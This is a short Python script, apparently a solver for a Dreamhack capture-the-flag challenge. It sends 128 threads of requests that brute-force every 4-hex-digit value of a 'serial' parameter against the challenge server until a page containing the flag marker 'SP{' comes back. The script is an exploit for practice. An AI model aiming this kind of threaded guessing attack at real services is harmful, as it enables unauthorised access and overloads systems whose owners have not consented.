import requests
from concurrent.futures import ThreadPoolExecutor
from threading import Event

url = "http://host3.dreamhack.games:18146/"
FIRST = 1
WORKERS = 128
stop = Event() # 스레드 상태값


def check(value):
    if stop.is_set():
        return
 
    h = f"{value:04X}"
    serial = f"M-S_{FIRST}-{h[:2]}-{h[2:]}"
    response = requests.get(
        url,
        params={"serial": serial},
        timeout=5
    )

    if "SP{" in response.text:
        stop.set()
        return serial


with ThreadPoolExecutor(max_workers=WORKERS) as executor:
    for result in executor.map(check, range(0x10000)):
        if result:
            print("FOUND:", result)
            break
    else:
        print("not found")